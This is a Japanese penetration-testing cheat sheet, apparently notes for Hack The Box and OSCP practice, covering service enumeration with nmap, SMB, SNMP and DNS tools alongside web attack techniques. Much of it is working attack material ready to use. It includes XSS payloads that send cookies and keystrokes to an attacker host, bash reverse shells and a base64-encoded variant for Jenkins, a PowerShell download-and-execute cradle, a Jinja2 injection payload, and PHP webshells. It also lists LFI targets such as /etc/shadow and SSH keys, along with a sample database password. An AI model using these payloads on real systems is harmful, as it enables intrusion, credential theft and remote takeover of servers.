# ペネトレーションテスト用チートシート
Hack The Boxの攻略やOSCPの取得を目指して、まとめているチートシートです。  
随時更新して成長していきます。

# Enum
## Nmap
```
kali@kali:$ sudo nmap -sC -sV -oN nmap/initial 10.10.10.1
```
```
kali@kali:$ sudo nmap -T5 -p- -oN nmap/full 10.10.10.1
```
```
kali@kali:$ sudo nmap --min-rate=10000 -p- -v 10.10.10.1
```
```
kali@kali:$ sudo nmap 10.10.10.1 -v -p- --min-rate=10000
(上記の結果を元に)kali@kali:$ sudo nmap -sC -sV -oN nmap/initial -v -p 22,80,3000
```
```
ports=$(nmap -p- --min-rate=10000 -T4 10.10.10.1 | grep ^[0-9] | cut -d '/' -f 1 | tr
'\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC 10.10.10.242
```
```
kali@kali:$ sudo nmap --script vuln 10.10.10.1
```
```
kali@kali:$ nmap --script http-enum 10.10.10.1 -p 80
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
```
|  オプション  |  説明  |
| ---- | ---- |
|  -sS  |  ステルス/SYNスキャン  |
|  -sT  |  TCPスキャン  |
|  -sU  |  UDPスキャン  |
|  -sn  |  ネットワークスイープ  |
|  -sC  |  --script=defaultの意味  |
|  -sV  |  特定のポートで動作しているサービスを識別  |
|  -O   |  OSフィンガープリンティング(ターゲットのOS判別)  |
|  -A   |  アグレッシブモード(サービス/OS検出・traceroute)   |
|  -T0~5  |  スキャンタイミングの指定<br>数字が大きくなるほどスキャン速度が速くなる<br>-T0や-T1を用いることでIPSなどの防御システムを回避できる可能性がある |
|  -v,-vv   |  詳細の出力  |
|  -oG  |  grep可能なファイル形式に出力  |
| --top-ports  |  優先度の高い順にポートを検出(/usr/share/nmap/nmap-servicesに依存)  |
| --script= |  様々なスクリプトの使用  |
|  |  dns-zone-transfer  |
|  |  smb-os-discovery  |
|  |  http-enum  |
|  |  vuln  |
|  -sN  |  NULLスキャン<br>フラグが設定されていない状態(空のパケット)でTCP要求を送信<br>ポートが閉じている場合、ターゲットホストはRSTで応答  |
|  -sF  |  FINスキャン<br>-sNと基本的に同じだがからのパケットを送信する代わりにFINフラグを使用して送信<br>ポートが閉じている場合、ターゲットホストはRSTで応答  |
|  -sX  |  Xmasスキャン<br>不正な形式のTCPパケットを送信<br>ポートが閉じている場合、ターゲットホストはRSTで応答  |


## Masscan
Massscanはインターネット全体を約6分でスキャンし、1秒間に1000万パケットという驚異的な数のパケットを送信する最速のポートスキャナー。  
raw socketsの権限を必要とするためsudoを用いる。  
下記のコマンドではTCPポート80が空いているホストをclass Aサブネットで列挙している。
```
kali@kali:~$ sudo masscan -p80 10.0.0.0/8
```

## FTP(21)
```
ログインユーザの指定...user (ユーザ名) (パスワード)
ファイル転送モードを指定...type (転送モード)
```
|  コマンド  |  説明  |
| ---- | ---- |
|  USER (username)<br>PASS (password)  |  ログイン情報の記述。  |
|  get (リモートファイル名) (ローカルファイル名)  |  	サーバのファイルをパソコンに転送。  |
|  mget (リモートファイル名 [...])  |  サーバの複数のファイルをパソコンに転送。 |
|  mput (ローカルファイル名 [...])  |  パソコンの複数のファイルをサーバに転送。 |
|  put (ローカルファイル名) (リモートファイル名)  | パソコンのファイルをサーバに転送。 |
|  type (転送モード)  |  	現在のファイル転送モードを表示。  |

## SSH(22)
### SCP
カレントディレクトリにsecret.zipをダウンロード
```
kali@kali:$ scp charix@10.10.10.84:/home/charix/secret.zip .
```

### SSHポートフォワーディング
#### ローカルポートフォワーディング
対象マシンの特定のポートで作動しているサービスをlocalhostでアクセスできるようにする。  
相手のsshサーバから自分のローカルホストへ引き寄せる。  
コマンドは自分のホストで発行。
```
kali@kali:$ ssh -L 8000:127.0.0.1:8000 charix@10.10.10.84
```
- -L...[相手の動作しているポート番号(対象マシン):ローカルホストアドレス(自分のマシン):ローカルで展開するポート番号(自分のマシン)]

#### リモートポートフォワーディング
対象マシンの特定のポートで作動しているサービスをlocalhostでアクセスできるようにする。  
自分のsshサーバへ飛ばす。  
コマンドは相手のホストで発行。
```
kali@kali:~$ sudo systemctl start ssh
```
```
ssh -R 8888:127.0.0.1:8888 kali@10.10.14.11
plink.exe -R 8888:127.0.0.1:8888 -l kali -pw kali 10.10.14.11
```
- -R...[相手の動作しているポート番号(自分のマシン):ローカルホストアドレス(対象マシン):サービスが展開されているポート(対象マシン)]

### ssh-keygen
```
ssh-keygen -t rsa -f id_rsa
chmod 600 id_rsa
```
- -t...暗号の種類(ed25519,rsaなど)
- -b...ビット数の固定(-t rsa -b 4096など)
- -f...ファイル名(id_????の?部分)

### 公開鍵認証方式でsshログイン
```
cat id_rsa.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
```
ssh -i id_rsa root@10.10.10.1
```

### id_rsaのクラック
```
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```
```
┌──(kali㉿kali)-[~/htb/boxes/Valentine]
└─$ openssl rsa -in id_rsa -out decrypt_id_rsa                                                                                                                                      1 ⨯
Enter pass phrase for test:<input key>
writing RSA key
```

## SMTP(25)
```
telnet 10.10.10.1 25
```
メールの送信:
```
MAIL FROM: <送信元のメールアドレス>
RCPT TO: <送信先のメールアドレス>
DATA
<送信内容の記述>
QUIT
```
```
nmap -p 25 --script smtp-commands 10.10.10.10
```
|  コマンド  |  動作  |
| ---- | ---- |
|  VERY  |  サーバに電子メールアドレスの確認を要求  |
|  EXPN  |  サーバにメーリングリストの資格を要求  |

## DNS(53)
- -NS(ネームサーバーレコード)...ドメインのDNSレコードをホストする権威サーバーの名前が含まれる
- -A(ホストレコード)...ホスト名のIPアドレスが含まれている
- -MX(mail Exchangeレコード)...ドメインの電子メール処理を担当するサーバーの名前が含まれている
- -PTR(ポインタレコード)...逆引きで使用されIPアドレスに関連するレコードを見つけるために使用される
- -TXT(テキストレコード)...テキストレコードは任意のデータを含むことができ、ドメインの所有権確認などを行える

hostコマンドはデフォルトではAレコードを検索するが、-tオプションをつけることで、その他のレコードを検索することも可能。
```
kali@kali:~$ host -t txt megacorpone.com
```

### ドメイン名の特定
DNSサーバー = 10.10.10.13  
ドメイン名を調べたいIPアドレス = 10.10.10.13  
10.10.10.13 = ns1.cronos.htb
```
┌──(kali㉿kali)-[~]
└─$ nslookup
> server 10.10.10.13　# DNSサーバーの指定
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13　# ドメイン名を知りたいIPアドレスの指定
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
```

### サブドメインの列挙
#### DNSゾーン転送
権威DNSサーバの設定不備によってゾーン情報を取得できることがある。  
これによりサーバーの名前、アドレス、機能などを調べることができる。
```
dig axfr cronos.htb @10.10.10.13
```
```
host -l <domain name> <dns server address>
```

#### DNSRecon
DNS列挙スクリプト。  
サブドメインの列挙。(ゾーン転送とブルートフォース)
```
1.kali@kali:~$ dnsrecon -d megacorpone.com -t axfr
2.kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```
- -d...ドメイン名の指定
- -t axfr...ゾーン転送
- -t brt...ブルートフォース
- -D...サブドメイン文字列を含むワードリストファイルの指定

#### DNSmap
サブドメインの列挙。(ブルートフォース)
```
┌──(root💀kali)-[/home/kali/htb/boxes/Cronos]
└─# dnsmap cronos.htb -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt                                                                127 ⨯
dnsmap 0.35 - DNS Network Mapper

[+] searching (sub)domains for cronos.htb using /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
[+] using maximum random delay of 10 millisecond(s) between requests

www.cronos.htb
IP address #1: 10.10.10.13
[+] warning: internal IP address disclosed

admin.cronos.htb
IP address #1: 10.10.10.13
[+] warning: internal IP address disclosed
```

#### DNSenum
DNSReconとは異なった出力をするDNS列挙ツール。
```
kali@kali:~$ dnsenum zonetransfer.me
```

#### OSINT
```
# 検索エンジンを利用した手動列挙
site:*.test.com,
```

Sublist3r(自動列挙ツール):  
https://github.com/aboul3la/Sublist3r
```
./sublist3r.py -d test.com
```

## HTTP(80)
### チェック項目
- robots.txt，sitemap.xmlの確認
- サブドメインの列挙
- ディレクトリスキャナーの使用
- CMSの特定
- ログインの試行
  - デフォルトパスワードの入力
  - パスワード推測
  - SQLインジェクションの試行
  - Webサイト上にある情報からユーザー/パスワードリストの作成
  - ブルートフォース
- BurpSuiteを用いてWebの挙動の確認
- URLを見て、LFIの脆弱性が無いか確認
- upload機構がある場合、バイパス方法の模索
- 掲載されている画像にヒントが無いか確認


### robots.txt，sitemap.xmlの確認
```
curl http://<IPアドレス>/robots.txt
curl http://<IPアドレス>/sitemap.xml
```

### /etc/hostsファイルの編集
```
sudo emacs /etc/hosts
10.10.10.1  admin.htb
```

### サブドメインの列挙
#### Gobuster(DNSモード)
DNSサブドメインのブルートフォース。  
-dオプションで指定したドメインのサブドメインを見つけるために使用する。
```
gobuster dns -d test.com -w subdomains-top1mil-5000.txt -i
```
- -d...ドメイン名の指定
- -i...IPアドレスの表示

#### Gobuster(Vhostモード)
組織が複数のドメイン名を1代のサーバーでホストしている仮想ホストを見つけることが可能。
```
gobuster vhost -u http://test.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt
```

### ffuf
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -u http://website.com/ -H “Host: FUZZ.website.com”
# 単語の量でフィルタリング
ffuf -w sublists.txt -u http://website.com/ -H “Host: FUZZ.website.com” -fw 3913
```
- -fw...単語の量でフィルタリング(一つ目のコマンドで表示された最も多いsizeの値を指定)
- -fl...行数でフィルタリング
- -fs...応答のサイズでフィルタリング
- -fc...ステータスコードでフィルタリング
- -fr...正規表現のパターンでフィルタリング

### サブディレクトリの列挙
#### dirb
```
dirb http://website.com -r -z 10
```
- -r...非再帰的にスキャン
- -z...各リクエストに10ミリ秒の遅延を加える

#### Gobuster
```
gobuster dir -t 50 -u <url>  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,py -o <output filename> -k
```
-dir...ディレクトリ総当たり
- -t...スレッド数
- -u...URL指定
- -w...wordlistの指定
- -o...ファイル出力
- -x...拡張子指定
- -k...SSLをスキップ
- -s...ステータスコードの指定

#### ffuf
```
Directory Fuzzing:
ffuf -c -w /path/to/wordlist -u http://test.com/FUZZ -v
Output File:
ffuf -c -w /path/to/wordlist -u http://test.com/FUZZ -e .php,txt -v > output.txt
```
- -c...出力をカラーにする
- -w...wordlistの指定
- -u...ターゲットURLの指定
- -e...拡張子の指定(.php,.txt,.aspx)
- --recursion...再帰的スキャン
- -v...冗長な出力
- -o...結果をファイルに出力

### Nikto
```
nikto -h <url> -Format txt -o <output filename>
```
- -h...url指定
- -t...スキャンのチューニング
- -Format...出力するファイルの拡張子を指定
- -o...ファイルへ出力する
- -ssl...SSLを使用するサイトで使用
- -maxtime=30s...指定された時間後にスキャンを停止

### BurpSuite
ローカルプロキシツール。  
通信の改ざんをするために使用。  
他にもXSSやSQLインジェクションなどの脆弱性を発見するために使う。  
LFIなどを利用する時にも使用。  

![](./image/2021-05-06-17-25-26.png)

#### Intruder
診断したいパラメータ部分に、自動で挿入を行ってくれる。  
これを利用することで、Repeterを用いた手動による検査ではなく、SQLインジェクションなどを自動化することが可能。  
また、ログインページのブルートフォースなどにも使用可能。


#### Repeater
HTTPリクエストをBurpから直接送信することで、繰り返しHTTPリクエストを送信することが可能。  
この機能を用いて、ログインフォームやOSコマンドインジェクションが疑われる箇所に対して、効率よく様々なスクリプトを挿入可能。

#### Do intercept(Response to this request)
HTTPレスポンスの改ざんが可能。  
これを利用することで、ステータスコード「302 Found」などで目的のページにたどり着く前に移動させられる際に、「200 Found」に変更してやることで目的のページへたどり着くことが可能。

### ディレクトリトラバーサル, LFI(ローカルファイルインクルード)
file_get_contents関数の不備
```
http://<url>/script.php?page=../../../../../../../../etc/passwd
http://<url>/script.php?page=../../../../../../../../etc/hosts
```

Examples: 
```
http://example.com/index.php?page=/etc/passwd
# /etc/passwdというキーワードがフィルタリングされている場合
http://example.com/index.php?page=/etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
```

#### LFIを利用して読み取りを狙うファイル:  
Linux
```
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/<username>/.ssh/authorized_keys
/home/<username>/.ssh/id_rsa
```
Windows
```
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/S
```

### RFI
allow_url_fopenオプションがONになっている場合に有効。
```
http://<Target IP>/<file>.php?file=http://<Attacker IP>/rs.php
```
### XSS(クロスサイトスクリプティング)
```
<script>alert(1);</script>
"><script>alert(1);</script>
<a onmouseover="alert(document.cookie)">XSS</a>
<iframe src="javascript:alert('XSS');"></iframe>
<IMG SRC=j&#X41vascript:alert('XSS')>
```
```
# ソースコードが下記のような場合
<script>
    document.getElementsByClassName('name')[0].innerHTML='test';
</script>

# 攻撃コードは以下のようになる
  「'」でフィールドを閉じて、「;」でコマンドを終了させる。 
  「//」でコメントを作成。
';alert('xss');//
```

```
# セッションハイジャック
<script>fetch('https://<Attacker IP>?cookie=' + btoa(document.cookie) );</script>

# キーロガー
<script>document.onkeypress = function(e) { fetch('https://<Attacker IP>?key=' + btoa(e.key) );}</script>

# メールアドレスの変更によるパスワードリセット攻撃
<script>user.changeEmail('attacker@hacker.thm');</script>
```
### SQLインジェクション
・後ろのスペースを入れて使用
```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or ('1'='1--
'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
```
#### UNION injection
[]
#### SQLインジェクション→reverse shell
SQLmap:
```
sqlmap -u http://192.168.56.1/vuln.php?id=1
sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent "Mozilla / 5.0（X11; Linux x86_64; rv：60.0 ）Gecko / 20100101 Firefox / 60.0 "
```

### XXE(XML external entitiy)
下のエクスプロイトでは、&xxe;と記述した箇所でfile:///etc/passwdを実行させている。
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
		<bugreport>
		<title>test</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>&xxe;</reward>
		</bugreport>
```

### SSRF(サーバサイドリクエストフォージェリ)
悪意のあるユーザーがWebサーバに攻撃者が選択したリソースに対して追加または編集されたHTTPリクエストを行わせるのを可能にする脆弱性。  
SSRFには2つのタイプがあり、1つ目はデータが攻撃者の画面に返される通常のSSRF。  
2つ目は、SSRFが発生するが攻撃者の画面に情報が返されたないBlind SSRF。  
SSRFの脆弱性が主に見つかる箇所としては、以下の4点が挙げられる。  
```
# アドレスバーのパラメータで完全なURLが使用されている場合
例) https//website.com/form?server=http://server.website.thm/store
# フォームの非表示フィールド
例) <input type="hidden" name="server" value="http://server.website.com/store">
# ホスト名などの部分的なURL
例) https://website.com/form?server=api
# URL内のパラメータでパスが使用されている場合
例) http://website.com/form?dst=/forms/contact
```


### SSTI(サーバサイドテンプレートインジェクション)
![](./image/2021-04-14-15-23-34.png)

・Jinja2(Reverse Shell)
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

## CMS
- CMSの特定後、ログインページについて調査
- その後、まずはデフォルトパスワードを入力
- 次にSQLインジェクションを試す
- サーバ内で見つけたものなどを用いて、パスワード推測
- 最終的にHydraなどでブルートフォース

## WordPress
### チェックするパス
```
# WordPressのバージョン確認
/license.txt

# ログインページ
/wp-admin/login.php
/wp-admin/wp-login.php
/login.php
/wp-login.php
```
### チェックするファイル
```
# データベースのパスワードあり
wp-config.php
```

### WPScan
パッシブスキャン
```
wpscan --update
wpscan --url <url> -e vp #脆弱なプラグイン特定
wpscan --url <url> -e vt #脆弱なTheme特定
wpscan --url <url> -e u #ユーザの列挙
wpscan --url <url> -e u t vp --log <output filename>
```
アグレッシブスキャン
```
wpscan --url <url> -e vp --plugins-detection aggressive
```
- -url...対象のURL指定
- -e 
  - u...usernameの列挙
  - vt...脆弱なテーマを列挙
  - vp...脆弱性のあるプラグインを列挙
- --log...ファイル出力

#### リスト型攻撃/パスワード推測攻撃
```
wpscan --url http://test.com/ --passwords /usr/share/wordlist/rockyou.txt
```
上記のコマンドにより、有効なWordPressユーザーを自動的に検出して指定したパスワードリストを使用してブルートフォースする。  
wp-login.phpページと有効になっている場合XMLRPCインタフェースを介したブルートフォースをサポートしている。

```
wpscan --url http://test.com/ --usernames admin --passwords /usr/share/wordlist/rockyou.txt
```
上記のようにユーザー名を指定することも可能。

#### Panel RCE
```
ログイン後、
1.[Appearance]→[Theme Editor]→[404 Template(404.php)]を選択して編集
2.PentestMonkeyのphp-reverse-shellをコピーして上書き
3.netcatでリバースシェルを待ち受け
4.下記のようなアドレスにアクセス
  http://192.168.1.101/wordpress/wp-content/themes/twentyfifteen/404.php
```

### Drupal
#### チェック項目
```
# バージョン確認
/CHANGELOG.txt
```

#### droopescan
```
pip3 install droopescan
```
```
droopescan scan drupal -u http://10.10.10.1 -t 32
```
- scan...スキャンの指定
  - SilverStripe
  - Wordpress
  - Drupal
- -u...URLの指定
- -t...スレッド数の指定

```
MySQLに接続するための認証情報が記述されている
/var/www/html/sites/default/settings.php

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

## phpMyAdmin
MySQLサーバをWebブラウザで管理するためのデータベース接続ツール。  
SQL文を記述することなく、MySQLの操作が行える。  
Wordpressのデータベースを管理できる場合、パスワードの変更などが可能。(MD5)
phpMyAdminの設定次第ではSQLタブ内に、下記のようなWebshellを埋め込むことが可能。
```
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {​​system($_GET[\'cmd\']);}​​ ?> </pre></BODY></HTML>"

INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
```
```
http://test.com/phpMyAdmin/cmd.php?cmd=ls
```

## Jenkins
### 　既知のエクスプロイト
pwn_jenkins:  
https://github.com/gquere/pwn_jenkins
### プロジェクトを作成してRCE
1.[New Item]→[Freestyle project]を選択して[Enter an item name]に名前を入力する。(testなど)
2.[Build]の中にあるタブからWindowsなら[Execute Windows batch command]、Linuxなら[Execute shell]を選択する。
3.[Command]にreverse shellペイロードを書き込んで[Save]を押下する。
　(bash -i >& /dev/tcp/10.0.0.1/8080 0>&1など)
4.最後に[Build Now]を押下すると、ペイロードが発火する。
### Grooby scriptを利用したRCE
1./scriptに移動する。  
2.Script Consoleに各OSに準じたスクリプトを書き込んで[Run]を押下する。  

#### Linux
```
echo "bash -i >& /dev/tcp/10.9.252.239/1234 0>&1" | base64                                 130 ⨯
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjI1Mi4yMzkvMTIzNCAwPiYxCg==
```
```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjI1Mi4yMzkvMTIzNCAwPiYxCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

#### Windows
```
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://10.10.10.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```

### Wappalyzer
Wappalyzerは、フレームワーク、コンテンツ管理システム(CMS)などのWebサイトが使用しているテクノロジーを特定するのに役立つオンラインツールおよびブラウザー拡張機能。バージョン番号も検索する。  
https://www.wappalyzer.com/
### exiftool
・画像情報の表示
```
exiftool image.jpg
```

・画像ファイルにexiftoolを用いてコメントにリバースシェルペイロードを記述
```
exiftool -Comment=’<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ image.png
```

### steghide
ステガノグラフィー
```
steghide extract -sf image.jpg
```

### binwalk
ファームウェアイメージを解析して抽出するツール。
```
binwalk -Me image.png
```
- -e...既知のファイルタイプを自動的に抽出
- -M...抽出されたファイルを再起的にスキャン

## POP3(110)
```
telnet 10.10.10.1 110
```
|  コマンド  |  動作  |
| ---- | ---- |
|  user <ユーザ名>  |  ユーザ名の入力  |
|  pass <パスワード>  |  パスワードの入力  |
|  stat  |  受信メールの件数を表示  |
|  list  |  受信メールの一覧を表示  |
|  retr <メール番号>  |  listコマンドで表示された番号を指定してメールを読む  |
|  dele <メール番号>  |  listコマンドで表示された番号を指定してメールを削除  |
|  quit  |  接続を終了  |

## NFS{RPCbind,Portmapper}(111)
Network File System(NFS)はクライアントコンピュータのユーザがあたかもローカルにマウントされたストレージ上にあるかのようにファイルにアクセスすることを可能にする。  
NFSはUNIX系OSで使用されることが多く、その実装は安全ではない。  
NFSで使用されるRPCbindとPortmapperはともにTCPポート111で動作する。
```
kali@kali:~$ nmap -v -p 111 10.10.10.1
```
```
kali@kali:~$ nmap -sV -p 111 --script=rpcinfo 10.10.10.1
```

NFSが動作していることが分かった場合/usr/share/nmap/scriptsにあるNSEスクリプトを使用して、サービスの列挙や追加サービスの発見を行うことができる。「*」を使用することで、まとめて使用することができる。
```
kali@kali:~$ sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.1
```
```
kali@kali:~$ ls -1 /usr/share/nmap/scripts/nfs*
/usr/share/nmap/scripts/nfs-ls.nse
/usr/share/nmap/scripts/nfs-showmount.nse
/usr/share/nmap/scripts/nfs-statfs.nse

kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.72
```

### /usr/sbin/showmountを使用したNFS共有の一覧表示
```
/usr/sbin/showmount -e 10.10.10.1
Export list for 10.10.10.1:
/home *
```

### NFSのマウント
mountコマンドを使用することでファイルのアクセスできるようになる。  
```
kali@kali:~$ mkdir /tmp/mount
kali@kali:~$ sudo mount -t nfs 10.10.10.1:/home /tmp/mount/ -nolock
kali@kali:~$ cd /tmp/mount && ls
```
- -t nfs...マウントするデバイスタイプの指定(今回はnfs)
- -nolock...NLMロックを使用しない

## SMB(139,445)
### SMBの列挙(Nmap NSE Scripts)
共有とユーザー名の列挙
```
sudo nmap -p 445 --script=smb-enum-shares,smb-enum-users 10.10.195.198
```
SMBによるOSの検出や列挙(smb-os-discovery):
```
kali@kali:~$ nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
```
SMBプロトコルの既知の脆弱性をチェックする場合:  
(unsafe=1にした場合、脆弱なシステムをクラッシュさせてしまう可能性があるので、本番システムをスキャンする場合は注意)
```
kali@kali:~$ nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.10.10.1
```

### enum4linux
```
enum4linx 10.10.10.1
```
```
enum4linux -a 10.10.10.1
```
```
enum4linux -S -U -o 10.10.10.1
```
- -S...共有リスト取得
- -U...ユーザリスト取得
- -o...OS情報取得
- -A...全ての基本的な列挙

### smbclient
匿名ログインが有効になっているかの確認。
```
smbclient -L 10.10.10.1
smbclient //10.10.10.1/tmp
smbclient //10.10.10.1/tmp -U <username>
```
- -U...ユーザ名の指定
- -p...ポートの指定

### smbmap
ドメイン全体のsamba共有ドライブを列挙するために使用。
```
smbmap -H 10.10.10.1
smbmap -u <user> -p <password> -H 10.10.10.1
smbmap -H 10.10.10.1 -d <domain> -u <user> -p <password>
```

### smbコマンド
|  コマンド  |  説明  |
| ---- | ---- |
|  dir  |  リスト表示  |
|  exit |  終了  |
|  get  |  取得  |
|  mget |  まとめて取得  |
|  mkdir  |  ディレクトリ作成  |
|  put  |  転送  |
|  mput  |  まとめて転送  |
|  lcd  |  ローカル側のディレクトリを移動  |
|  mdir  |  ディレクトリ削除  |


### impacket
ネットワークプロトコルを操作するためにPythonクラスのコレクション。  
SMB1-3やMSRPCなどのプロトコル実装自体を提供することに重点を置いている。  
ツールを利用する以外にもよくexploitに使われているので、インストールしておく必要がある。
```
git clone https://github.com/SecureAuthCorp/impacket.git
pip install .
```
#### impacket-smbclient
```
/usr/share/doc/python3-impacket/examples/smbclient.py username@10.10.10.1
```

#### impacket-smbserver
対象サーバにツールを送り込む際に使用。  
主にnetcatもpowershellも使えないようなときに使う。  
```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp .
```
```
C:\WINDOWS\system32>\\<smbserverを立ち上げたIPアドレス>\temp\whoami.exe
```

#### RPCclient
```
rpcclient -U "" -N 10.10.10.1
```

#### CrackMapExec
```
crackmapexec smb -L 
crackmapexec 10.10.10.1 -u Administrator -H [hash] --local-auth
crackmapexec 10.10.10.1 -u Administrator -H [hash] --share
crackmapexec smb 10.10.10.1/24 -u user -p 'Password' --local-auth -M mimikatz
```

### nmap-smb
```
nmap --script smb-* -p 139,445, 10.10.10.1
nmap --script smb-enum-* -p 139,445, 10.10.10.1
```


### NetBIOS(139)
NetBIOSはローカルネットワーク上のコンピュータが相互に通信できるようにするセッション層のプロトコルである。  
最近のSMBの実装ではNetBIOSがなくても動作するが、NetBIOS over TCP(NBT)は後方互換性のために必要で、ともに有効になっている場合が多い。
```
kali@kali:~$ nmap -v -p 139,445 -oG result.txt 10.10.10.1
```
#### nbtscan
NetBIOS情報を特定するための専門的ツール。オプション-rを使用することで発信元のUDPポートを137に指定している。
```
kali@kali:~$ sudo nbtscan -r 10.11.1.0/24
```
## SNMP(161)
SNMPはルータ、スイッチ、サーバなどのTCP/IPネットワークに接続された通信機器に対して、ネットワーク経由で監視、制御するためのUDPベースのアプリケーション層プロトコル。  
SNMP1,2,2cではトラフィックの暗号化が行われていないため、SNMP情報や認証情報をローカルネットワーク上で傍受することができてしまう。  
MIBはネットワーク管理に関連する情報を含むデータベースのことでツリー上になっている。
その下にSNMPコミュニティと呼ばれるSNMPで管理するネットワークシステムの範囲を定めたものがある。
```
kali@kali:~$ sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
```

### Windows SNMPの列挙
#### MIBツリーの列挙
```
kali@kali:~$ snmpwalk -c public -v1 -t 10 10.10.10.1
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPAT
IBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
iso.3.6.1.2.1.1.3.0 = Timeticks: (2005539644) 232 days, 2:56:36.44
iso.3.6.1.2.1.1.4.0 = ""
```
- -c...コミュニティ文字列を指定
- -v...SNMPバージョン番号の指定
- -t...タイムアウト期間の設定

#### Windowsユーザーの列挙
```
kali@kali:~$ snmpwalk -c public -v1 10.10.10.1 1.3.6.1.4.1.77.1.2.25
iso.3.6.1.4.1.77.1.2.25.1.1.3.98.111.98 = STRING: "bob"
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.8.73.85.83.82.95.66.79.66 = STRING: "IUSR_BOB"
```

#### 実行中のWindowsプロセス列挙n
```
kali@kali:~$ snmpwalk -c public -v1 10.10.10.1 1.3.6.1.2.1.25.4.2.1.2
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "System Idle Process"
iso.3.6.1.2.1.25.4.2.1.2.4 = STRING: "System"
iso.3.6.1.2.1.25.4.2.1.2.224 = STRING: "smss.exe"
iso.3.6.1.2.1.25.4.2.1.2.324 = STRING: "csrss.exe"
iso.3.6.1.2.1.25.4.2.1.2.364 = STRING: "wininit.exe"
iso.3.6.1.2.1.25.4.2.1.2.372 = STRING: "csrss.exe"
iso.3.6.1.2.1.25.4.2.1.2.420 = STRING: "winlogon.exe"
```

#### TCPポートの列挙
```
kali@kali:~$ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.21.0.0.0.0.18646 = INTEGER: 21
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.80.0.0.0.0.45310 = INTEGER: 80
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.135.0.0.0.0.24806 = INTEGER: 135
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.443.0.0.0.0.45070 = INTEGER: 443
```

#### インストールされているソフトウェアの列挙
```
